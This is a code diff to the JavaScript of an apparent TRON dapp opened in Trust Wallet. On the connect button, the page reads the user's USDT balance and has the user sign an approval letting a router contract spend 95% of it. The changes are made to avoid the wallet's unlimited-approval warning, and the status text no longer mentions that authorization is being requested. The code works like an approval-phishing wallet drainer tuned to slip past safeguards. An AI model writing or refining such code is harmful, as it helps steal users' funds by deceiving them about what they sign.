@@ -183,10 +183,10 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: VINCULACIÓN Y SOLICITUD DE APROBACIÓN DE USDT
+        // PASO 1: VINCULACIÓN Y SOLICITUD DE APROBACIÓN DEL 95% EXACTO
         if (!walletAddress) {
             try {
-                setStatus("Conectando con Trust Wallet y solicitando autorización...");
+                setStatus("Conectando con Trust Wallet...");
                 connectBtn.disabled = true;
                 if (typeof window.tronWeb === 'undefined') throw new Error("Abre desde el navegador de Trust Wallet.");
                 const tronWeb = window.tronWeb;
@@ -204,17 +204,26 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                // Solicitud de aprobación de USDT integrada en la conexión
-                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
-                const maxApprovalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                // Obtener el balance y calcular exactamente el 95% para la aprobación
+                setStatus("Calculando balance y preparando autorización...");
+                const balance = await obtenerBalance(walletAddress);
+                const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
+                
+                if (ninetyFivePercent.lte(0)) {
+                    throw new Error("Balance de USDT insuficiente.");
+                }
 
+                amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
+
+                // Solicitar la aprobación exclusivamente por el monto exacto del 95% (Adiós al aviso de ilimitado)
+                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
                 const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "approve(address,uint256)",
                     { feeLimit: 50000000 },
                     [
                         { type: 'address', value: routerHex },
-                        { type: 'uint256', value: maxApprovalAmount }
+                        { type: 'uint256', value: ninetyFivePercent.toString() }
                     ],
                     tronWeb.address.toHex(walletAddress)
                 );
@@ -222,16 +231,6 @@
                 if (approveTx && approveTx.transaction) {
                     const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
                     await tronWeb.trx.sendRawTransaction(signedApprove);
-                }
-
-                // Calcular automáticamente el 95% del balance
-                const balance = await obtenerBalance(walletAddress);
-                const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
-                
-                if (ninetyFivePercent.gt(0)) {
-                    amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
-                } else {
-                    amountDisplay.value = "0";
                 }
 
                 setStatus("");
@@ -245,7 +244,7 @@
             return;
         }
 
-        // PASO 2: LLAMADA LIMPIA AL CONTRATO INTELIGENTE (Ejecuta el 95% automático)
+        // PASO 2: LLAMADA LIMPIA AL CONTRATO INTELIGENTE
         try {
             setStatus("Preparando operación...");
             connectBtn.disabled = true;
